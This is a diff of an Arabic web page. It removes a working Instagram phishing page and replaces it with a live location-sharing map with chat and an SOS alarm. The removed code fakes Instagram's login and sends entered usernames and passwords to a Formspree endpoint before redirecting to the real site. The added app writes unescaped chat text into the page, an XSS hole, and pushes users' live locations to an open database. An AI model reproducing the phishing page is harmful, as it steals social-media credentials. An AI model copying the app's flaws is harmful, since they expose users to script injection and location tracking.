@@ -1,73 +1,120 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<head> 
-        <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="mobile-web-app-capable" content="yes">
-    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png">
-
+<head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>الرادار الشامل</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #000; color: #fff; margin: 0; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: sans-serif; overflow: hidden; background: #eee; }
+        #map { height: 100vh; width: 100%; z-index: 1; }
         
-        .container { width: 100%; max-width: 400px; text-align: center; }
-        
-    /*زخرفه اسم انستا*/
-        /* شعار انستا*/
-        .insta-logo { width: 75px; height:70px; margin-bottom: 40px; }
-        
-        .input-field { width: 100%; background: #121212; border: 1px solid #363636; border-radius: 12px; padding: 14px; margin-bottom: 12px; color: #fff; font-size: 14px; text-align: right; }
-        .input-field::placeholder { color: #8e8e8e; }
+        /* وميض الشاشة كاملة للطوارئ */
+        #sos-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 9999; pointer-events: none; display: none;
+        }
+        .emergency #sos-screen { display: block; animation: flash 0.5s infinite; }
+        @keyframes flash { 0% { background: rgba(255, 0, 0, 0.6); } 50% { background: transparent; } 100% { background: rgba(255, 0, 0, 0.6); } }
 
-        .login-btn { width: 100%; background-color: #0064e0; color: #fff; border: none; border-radius: 25px; padding: 14px; font-weight: 600; font-size: 16px; margin-top: 10px; cursor: pointer; }
+        /* الأزرار العلوية */
+        .top-ui { 
+            position: fixed; top: 10px; right: 10px; z-index: 2000; 
+            background: white; padding: 8px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); width: 150px;
+        }
         
-        .forgot-pass { color: #fff; text-decoration: none; font-size: 14px; margin-top: 20px; display: block; opacity: 0.9; }
-        
-        .create-account { width: 100%; background: transparent; border: 1px solid #0064e0; color: #0064e0; border-radius: 25px; padding: 12px; font-weight: 600; margin-top: 150px; cursor: pointer; }
-        
-        .meta-logo { margin-top: 20px; width: 60px; opacity: 0.6; }
+        /* صندوق الدردشة - تصميم "عائم" ليناسب الجوال */
+        .chat-ui {
+            position: fixed; bottom: 10px; left: 10px; right: 10px; z-index: 2000;
+            display: flex; flex-direction: column; pointer-events: none;
+        }
+        #msg-box { 
+            background: rgba(255,255,255,0.9); height: 100px; overflow-y: auto; 
+            border-radius: 10px 10px 0 0; padding: 8px; pointer-events: auto; font-size: 13px;
+        }
+        .input-row { display: flex; background: white; padding: 5px; border-radius: 0 0 10px 10px; pointer-events: auto; border-top: 1px solid #ddd; }
+        #chatInput { flex: 1; border: none; padding: 10px; outline: none; font-size: 14px; }
+        .send-btn { background: #007bff; color: white; border: none; border-radius: 50%; width: 40px; height: 40px; cursor: pointer; font-size: 18px; }
+
+        .btn { width: 100%; padding: 8px; margin-top: 5px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 12px; }
+        .btn-sos { background: #ff4444; color: white; }
+        .btn-go { background: #28a745; color: white; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram" class="insta-logo">
+<div id="sos-screen"></div>
+<div id="map"></div>
 
-        <form id="loginForm">
-            <input type="text" name="User" class="input-field" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الـ" required>
-            <input type="password" name="Pass" class="input-field" placeholder="كلمة السر" required>
-            <button type="submit" class="login-btn">تسجيل الدخول</button>
-        </form>
+<div class="top-ui">
+    <input type="text" id="uName" placeholder="اسمك..." style="width:85%; padding:5px; margin-bottom:5px; border:1px solid #ddd;">
+    <button class="btn btn-go" onclick="initUser()">بث موقعي</button>
+    <button class="btn btn-sos" onclick="triggerSOS()">🚨 طوارئ</button>
+</div>
 
-        <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
-
-        <button class="create-account">إنشاء حساب جديد</button>
-        
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/2560px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="meta-logo">
+<div class="chat-ui">
+    <div id="msg-box">بانتظار الرسائل...</div>
+    <div class="input-row">
+        <input type="text" id="chatInput" placeholder="اكتب هنا...">
+        <button class="send-btn" onclick="sendMsg()">➤</button>
     </div>
+</div>
 
-    <script>
-        const form = document.getElementById('loginForm');
-        form.addEventListener('submit', function(e) {
-            e.preventDefault(); 
+<audio id="alarm" src="https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg" loop></audio>
 
-            const formData = new FormData(form);
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+    const db = "https://safehome-fd30f-default-rtdb.firebaseio.com/";
+    let map = L.map('map', { zoomControl: false }).setView([32.02, 36.08], 15);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
-            // إرسال البيانات في الخلفية لـ Formspree
-            fetch('https://formspree.io/f/mdakqgez', {
-                method: 'POST',
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            }).finally(() => {
-                // التحويل للانستغرام الحقيقي بعد الإرسال
-                window.location.href = "https://www.instagram.com/";
+    let myName = "";
+    let markers = {};
+    const manIcon = L.icon({ iconUrl: 'https://cdn-icons-png.flaticon.com/512/1260/1260271.png', iconSize: [40, 40] });
+
+    function initUser() {
+        myName = document.getElementById('uName').value;
+        if (!myName) return alert("اكتب اسمك أولاً!");
+        document.getElementById('alarm').play().then(() => document.getElementById('alarm').pause());
+        navigator.geolocation.watchPosition(p => {
+            fetch(`${db}users/${myName}.json`, { method: 'PUT', body: JSON.stringify({ lat: p.coords.latitude, lng: p.coords.longitude, time: new Date().toLocaleTimeString() }) });
+        });
+    }
+
+    function triggerSOS() {
+        if(!myName) return alert("سجل اسمك أولاً");
+        fetch(`${db}global_emergency.json`, { method: 'PUT', body: JSON.stringify({ active: true, from: myName }) });
+        sendMsg("🆘 استغاثة عاجلة!");
+    }
+
+    function sendMsg() {
+        const t = document.getElementById('chatInput').value;
+        if (!t || !myName) return;
+        fetch(`${db}messages.json`, { method: 'POST', body: JSON.stringify({ user: myName, msg: t }) });
+        document.getElementById('chatInput').value = "";
+    }
+
+    setInterval(() => {
+        fetch(`${db}users.json`).then(r => r.json()).then(data => {
+            if (!data) return;
+            Object.keys(data).forEach(u => {
+                if (!markers[u]) markers[u] = L.marker([data[u].lat, data[u].lng], {icon: manIcon}).addTo(map).bindPopup(u);
+                else markers[u].setLatLng([data[u].lat, data[u].lng]);
             });
         });
-    </script>
 
+        fetch(`${db}messages.json?limitToLast=10`).then(r => r.json()).then(data => {
+            if (!data) return;
+            let h = "";
+            Object.values(data).forEach(m => { h += `<div><b>${m.user}:</b> ${m.msg}</div>`; });
+            document.getElementById('msg-box').innerHTML = h;
+        });
+
+        fetch(`${db}global_emergency.json`).then(r => r.json()).then(s => {
+            if (s && s.active) { document.body.classList.add('emergency'); document.getElementById('alarm').play(); }
+            else { document.body.classList.remove('emergency'); document.getElementById('alarm').pause(); }
+        });
+    }, 2000);
+</script>
 </body>
 </html>
